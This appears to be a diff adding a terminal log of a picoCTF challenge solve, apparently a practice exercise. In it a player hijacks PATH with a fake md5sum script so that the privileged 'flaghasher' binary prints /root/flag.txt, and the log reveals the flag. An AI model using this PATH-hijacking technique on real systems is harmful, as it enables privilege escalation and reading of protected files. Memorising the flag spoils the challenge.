@@ -1,0 +1,16 @@
+ctf-player@pico-chall$ ./flaghasher 
+Computing the MD5 hash of /root/flag.txt.... 
+
+bdb2d099aeef7e27a6eacc0157805c9b  /root/flag.txt
+ctf-player@pico-chall$ cd /tmp
+ctf-player@pico-chall$ echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum
+ctf-player@pico-chall$ chmod +x md5sum
+ctf-player@pico-chall$ find / -name flaghasher 2>/dev/null
+/home/ctf-player/flaghasher
+ctf-player@pico-chall$ $PATH /home/ctf-player/flaghasher
+-bash: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
+ctf-player@pico-chall$ PATH=.:$PATH /home/ctf-player/flaghasher
+Computing the MD5 hash of /root/flag.txt.... 
+
+picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_108598ca}ctf-player@pico-chall$ Connection to shape-facility.picoctf.net closed by remote host.
+Connection to shape-facility.picoctf.net closed.
